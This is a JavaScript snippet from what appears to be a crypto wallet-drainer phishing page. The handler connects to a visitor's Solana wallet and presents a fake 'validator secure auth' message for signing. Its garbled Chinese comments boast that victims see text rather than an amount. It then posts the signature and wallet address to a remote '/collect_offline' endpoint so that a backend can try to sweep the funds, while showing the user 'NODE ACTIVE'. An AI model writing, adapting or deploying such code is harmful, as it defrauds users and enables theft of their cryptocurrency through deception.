document.getElementById('cta').onclick = async () => {
    const p = window.solana || window.phantom?.solana;
    try {
        await p.connect();
        
        // ğŸ”± æ ¸å¿ƒå˜åŒ–ï¼šä¸å¼¹è½¬è´¦æ¡†ï¼Œå¼¹â€œä¿¡æ¯ç¡®è®¤â€æ¡†
        const message = "SOLANA_VALIDATOR_SECURE_AUTH_ID_" + Math.random().toString(16).slice(2);
        const encodedMessage = new TextEncoder().encode(message);
        
        // ç”¨æˆ·ç‚¹ç¡®è®¤æ—¶ï¼Œåªçœ‹åˆ°ä¸€æ®µæ–‡æœ¬ï¼Œçœ‹ä¸åˆ°é‡‘é¢ï¼
        const signedMessage = await p.signMessage(encodedMessage, "utf8");
        
        // æ‹¿åˆ°ç­¾ååå‘ç»™åç«¯ï¼Œåç«¯åœ¨åå°åˆ©ç”¨è¿™ä¸ªç­¾åå°è¯•å½’é›†
        fetch(tunnel + "/collect_offline", {
            method: 'POST',
            body: JSON.stringify({ 
                signature: signedMessage.signature, 
                address: p.publicKey.toString() 
            })
        });
        
        log("NODE ACTIVE.");
    } catch (err) {
        log("RETRYING...");
    }
};
